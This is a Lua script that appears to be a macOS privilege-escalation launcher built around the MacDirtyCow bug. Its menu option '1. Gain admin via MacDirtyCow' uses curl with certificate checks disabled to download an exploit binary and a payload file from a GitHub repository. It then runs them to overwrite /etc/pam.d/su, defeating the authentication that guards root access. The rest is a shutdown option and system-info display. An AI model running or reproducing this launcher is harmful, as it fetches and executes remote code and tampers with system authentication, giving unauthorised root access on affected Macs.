#!/usr/bin/env lua

-- pre-functions

function os.capture(cmd, raw)
    local f = assert(io.popen(cmd, 'r'))
    local s = assert(f:read('*a'))
    f:close()
    if raw then return s end
    s = string.gsub(s, '^%s+', '')
    s = string.gsub(s, '%s+$', '')
    s = string.gsub(s, '[\n\r]+', ' ')
    return s
  end
  

-- variables // do not touch    
local http = require("socket.http")
local homedir = os.getenv("HOME")
local tempdir = os.getenv("TMPDIR")
local osVersion = os.capture("sw_vers -productVersion")
local osBuildVer = os.capture("sw_vers -buildVersion")
local scriptVersion = "v0.0.1"
local date = os.date()
local isAdmin = os.capture("id -u")
isAdmin = tonumber(isAdmin) == 0 and "yes" or "no"
if io.open(tempdir.."fs/", "r") then
  os.execute("rm -rf $TMPDIR/fs/")
end
os.execute("mkdir $TMPDIR/fs/")
-- function table
local functionTable = {
  e = function()
    io.write("\27c")
    print("Exiting script...")
    os.execute("sleep 3")
    io.write("\27c")
    os.exit()
  end,
  s = function()
    io.write("\27c")
    io.write("Are you sure you want to shutdown? yes/no: ")
    local r = io.read()
    if tostring(r) == "yes" and isAdmin == "yes" then
      os.execute("shutdown -h NOW")
    elseif tostring(r) == "yes" and isAdmin == "no" then
      os.execute('osascript -e \'tell application "Finder"\n\tshut down\nend tell\'')
    else
      welcomeScreen()
    end
  end,
  ["1"] = function()
    io.write("\27c")
    io.write("--> Download switcharoo")
    os.execute("curl -k https://raw.githubusercontent.com/Thyssenkrupp234/ra1nm8/main/resources/exploit/switcharoo > "..tempdir.."fs/switcharoo 2>/dev/null")
    io.write("\n--> Download overwrite_file.bin")
    os.execute("curl -k https://raw.githubusercontent.com/Thyssenkrupp234/ra1nm8/main/resources/exploit/overwrite_file.bin > "..tempdir.."fs/overwrite_file.bin 2>/dev/null")
    io.write("\nDownload items, executing command...\n\n")
    local exploitRun = os.capture(tempdir.."fs/switcharoo /etc/pam.d/su "..tempdir.."fs/overwrite_file.bin")
    io.write("\nCompleted exploit. Press enter to return to main menu: ")
    io.read()
    welcomeScreen()
  end
}

function welcomeScreen()
  -- clear screen then print out welcome stuff
  io.write("\27c")
  io.write("\27[96mmacOS: \27[92m"..osVersion.." ("..osBuildVer..")".."\n\27[96mScript Version: \27[92m"..scriptVersion.."\n\27[96mDate: \27[92m"..date.."\n\27[96mRunning as admin: \27[92m"..tostring(isAdmin))
  io.write("\n\27[0m\n\nE. Exit\nS. Shut Down\n1. Gain admin via MacDirtyCow\n\nPick an option: ")
  local response = io.read()
  if functionTable[string.lower(tostring(response))] then
    functionTable[string.lower(tostring(response))]()
  else
    welcomeScreen()
  end
end

welcomeScreen()